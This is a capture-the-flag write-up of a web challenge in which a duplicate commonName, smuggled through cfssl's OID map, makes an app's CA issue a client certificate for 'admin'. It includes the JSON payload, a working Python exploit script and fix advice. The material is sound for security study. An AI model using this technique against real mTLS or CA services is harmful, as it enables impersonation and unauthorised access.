---
title: "Authenticator — CSR CN smuggling"
category: Web
host: authenticator.is-course.ru
tags: [x509, csr, pkix, extra-names, mtls]
technique: "cfssl `Names[].OID` smuggles a second CN (last wins)"
status: solved
---

# Authenticator

## Recon
Users register, then request a client certificate from the app's own CA (`POST /api/create_certificate`
with a JSON CSR-ish payload). nginx is configured with `ssl_verify_client optional` and forwards
`X-Certificate-DN` / `X-Certificate-Check: SUCCESS`; the backend logs you in when the DN's CN matches a
user — *any* user, including `admin`.

The handler does the right thing at first glance: it sets `crtReq.CN = username` before signing. But it
also accepts a `names` array and passes it straight into cfssl's `CertificateRequest`.

## The bug
`cfssl.CertificateRequest.Names []Name` has an **`OID map[string]string`** field. `Name()` turns every
entry of that map into `pkix.Name.ExtraNames`. Go's `pkix.Name.ToRDNSequence()` writes the primary CN
first and ExtraNames **afterwards**, while `x509.ParseCertificateRequest` → `FillFromRDNSequence`
assigns every CN in order (last wins). So a second CN smuggled through `OID` overrides the one the app
set.

```json
{"key":{"algo":"rsa","size":2048},"names":[{"OID":{"2.5.4.3":"admin"}}]}
```

The issued cert is `subject=CN=admin, issuer=CN=RootCA`; present it to nginx and the backend greets you
as admin, exposing the SECURE note:

`YDS{…redacted…}`
(the flag literally contains two U+FEFF zero-width characters — copy it byte-exact).

## Reproducing it (verified live)

```python
import requests, json, time

B = "https://authenticator.is-course.ru"
s = requests.Session(); s.verify = False
u = "attacker%d" % int(time.time())

s.post(B + "/register", data={"username": u, "password": "Passw0rd!xyz"}, allow_redirects=False)
s.post(B + "/login",    data={"username": u, "password": "Passw0rd!xyz"}, allow_redirects=False)

body = {"key": {"algo": "rsa", "size": 2048},
        "names": [{"OID": {"2.5.4.3": "admin"}}]}          # 2.5.4.3 = commonName
d = s.post(B + "/api/create_certificate", json=body).json()
open("cli.crt", "w").write(d["certificate"])
open("cli.key", "w").write(d["private_key"])

# the CA is trusted by nginx, and the CN is the authorisation check
r = requests.get(B + "/profile", cert=("cli.crt", "cli.key"), verify=False)
print(r.text)      # SECURE note with the flag
```

The issued certificate really is `CN=admin, issuer=CN=RootCA` — you can see `"admin"` in the DER
(`...EwVhZG1pbj...`) before you even present it. The flag contains **two U+FEFF zero-width characters**
(directly before `task_` and at the very end), so copy it byte-exact — a "wrong flag" rejection is
almost certainly a stripped/BOM-normalised copy.

## What the handler should have done

1. Build the subject **only** from server-side data (`pkix.Name{CommonName: username}`), never from a
   client-supplied `names` array.
2. After issuance, re-parse the certificate and assert `subject.CommonName == username` and that the
   subject has exactly one CN (Go's `pkix` allows duplicates via `ExtraNames`, and
   `FillFromRDNSequence` silently keeps the last one).
3. Better: stop using the certificate subject as an identity token — use a per-user key and check
   revocation/mapping server-side.

## Fix
Do not accept arbitrary `OID` maps from clients; build the subject from server-side data only, and
validate the parsed certificate subject after issuance.
